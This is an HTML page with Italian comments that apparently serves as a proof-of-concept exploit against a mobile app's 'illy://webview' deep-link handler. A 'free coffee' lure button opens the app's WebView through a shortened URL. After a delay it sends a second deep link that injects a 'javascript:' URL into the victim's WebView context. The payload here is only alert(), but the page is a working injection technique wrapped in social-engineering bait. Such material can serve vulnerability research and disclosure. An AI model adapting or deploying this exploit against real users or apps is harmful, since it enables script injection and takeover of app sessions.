<!DOCTYPE html>
<html>
<head>
    <title>Sconto Esclusivo</title>
</head>
<body>
    <script>
        function launch() {
            // STEP 1: Apriamo la pagina target (il contesto della vittima)
            // Usiamo una URL che sappiamo caricherà una WebView nell'app
            window.location.href = "illy://webview?url=https://rb.gy/yxj0hx";

            // STEP 2: Iniezione del JS via Deep Link
            // Usiamo un delay leggermente più corto o più lungo a seconda del dispositivo
            setTimeout(function() {
                
                // Spariamo il secondo Deep Link
                window.location.href = "illy://webview?url=javascript:alert()";
            }, 2500); 
        }
    </script>
    <button onclick="launch()" style="width:100%; height:200px; font-size:30px;">
        CLICCA QUI PER IL CAFFÈ OMAGGIO
    </button>
</body>
</html>
